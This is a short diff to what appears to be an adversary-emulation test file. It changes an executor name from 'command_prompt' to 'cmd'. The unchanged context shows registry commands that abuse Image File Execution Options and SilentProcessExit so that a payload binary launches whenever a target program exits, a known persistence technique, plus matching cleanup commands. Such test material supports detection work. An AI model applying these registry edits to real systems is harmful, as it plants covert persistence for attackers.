@@ -28,10 +28,10 @@ steps:
         REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\{{.Args.target_binary}}" /v GlobalFlag /t REG_DWORD /d 512
         REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\{{.Args.target_binary}}" /v ReportingMode /t REG_DWORD /d 1
         REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\{{.Args.target_binary}}" /v MonitorProcess /d "{{.Args.payload_binary}}"
-      executor: command_prompt
+      executor: cmd
       cleanup:
         inline: |
             reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\{{.Args.target_binary}}" /v GlobalFlag /f >nul 2>&1
             reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\{{.Args.target_binary}}" /v ReportingMode /f >nul 2>&1
             reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\{{.Args.target_binary}}" /v MonitorProcess /f >nul 2>&1
-        executor: command_prompt
+        executor: cmd
